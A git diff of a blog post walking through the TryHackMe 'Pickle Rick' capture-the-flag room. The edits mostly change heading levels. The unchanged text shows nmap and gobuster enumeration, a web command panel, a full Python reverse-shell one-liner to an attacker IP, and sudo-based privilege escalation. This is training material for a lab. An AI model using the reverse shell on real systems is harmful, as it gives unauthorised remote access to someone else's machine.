@@ -13,11 +13,11 @@ tags: [tryhackme, linux, web, reverse-shell, python, gobuster]
 
 Hello l33ts, I hope you are doing well. Today we are going to look at [Pickle Rick](https://tryhackme.com/room/picklerick) from TryHackMe.
 
-# **Description**
+## **Description**
 
 This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.
 
-# **Enumeration**
+## **Enumeration**
 
 As usual, let's start our nmap scan using this commad : `sudo nmap -sV -sC {target_IP} -oN nmap.scan`
 
@@ -27,7 +27,7 @@ As usual, let's start our nmap scan using this commad : `sudo nmap -sV -sC {targ
 
 -oN - save the output in a file called nmap
 
-## nmap
+### nmap
 
 ```terminal
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 10:06 EST
@@ -50,6 +50,7 @@ Nmap done: 1 IP address (1 host up) scanned in 22.00 seconds
 ```
 
 We see that there is 2 open ports:
+
 - 22(SSH)
 - 80(HTTP)
 
@@ -61,7 +62,7 @@ Nice, we have found a username,Let's now run Gobuster directory scan using the f
 
 - -x: is to tell gobuster to search for extensions(php, txt)
 
-## Gobuster
+### Gobuster
 
 ```terminal
 ===============================================================
@@ -107,7 +108,7 @@ We have the username and the weird string we found in robots.txt, let's supply t
 
 Great, we are in, and it seems we have a command panel where we can execute code on the target, let's try to get a reverse shell with that.
 
-# **Foothold**
+## **Foothold**
 
 After checking that python3 is installed on the target machine with `which python3` command, i executed the following command to get a reverse shell on my machine after setting up a listener of cource: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
 
@@ -135,9 +136,9 @@ www-data@ip-10-10-237-232:/var/www/html$
 
 The commands i executed are for getting a stable shell.
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
-When we run `sudo -l ` we see that we can run whatever we want!
+When we run `sudo -l` we see that we can run whatever we want!
 
 ```terminal
 www-data@ip-10-10-237-232:/home/rick$ sudo -l
